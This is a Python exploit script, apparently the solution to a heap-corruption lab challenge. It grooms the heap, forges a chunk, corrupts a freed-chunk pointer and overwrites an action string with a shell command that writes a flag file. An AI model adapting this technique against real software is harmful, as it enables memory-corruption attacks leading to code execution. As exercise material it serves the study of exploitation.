import struct
from base64 import b64encode

chunkLength = 0x118 # 280
extLength = (chunkLength & ~0xff) | 0xf0 # 496
baseHeap = 0x603260 #0x555555757260 # 0x555555559260
targetChunkOffset = 0xc20 # 0x555555559e80
targetOffset = 128
payload = b'echo "success" > /home/privileged/heapcorruption-medium\x00'

def force_free():
  print('H Small Hostname')
  return

def write_garbage():
  print('U'*chunkLength)
  return

def reserve_vulnerable():
  print('H ' + 'X'*(chunkLength-1))
  return

def overwrite_length():
  data = b64encode(b'A'*chunkLength)
  data = data.replace(b'=',b'')[:-1] + b'PE'
  print('A ' + data.decode())
  return

def reserve_fake():
  data = b'F'*0xd0
  data += struct.pack('<Q',0)
  data += struct.pack('<Q', 0x40) 
  data += b'F'*(chunkLength - len(data) - 1)
  data = b64encode(data)
  print('A ' + data.decode())
  return

def corrupt_pointer():
  data = b'C'*chunkLength
  data += struct.pack('<Q', 0x121)
  data += struct.pack('<Q', baseHeap + targetChunkOffset)
  data += b'C'*(extLength - len(data) - 0x10)
  data = b64encode(data)
  print('A ' + data.decode())
  return

def overwrite_action():
  data = b'X'*targetOffset
  data += payload
  data += b'X'*(chunkLength - len(data) - 1)
  data = b64encode(data)
  print('A ' + data.decode())
  return

def trigger_action():
  print('X xxx')
  return

def exploit():
  force_free()
  write_garbage()
  reserve_vulnerable()
  overwrite_length()
  reserve_fake()
  force_free()
  corrupt_pointer()
  write_garbage()
  overwrite_action()
  trigger_action()
  return


if __name__ == '__main__':

  exploit()
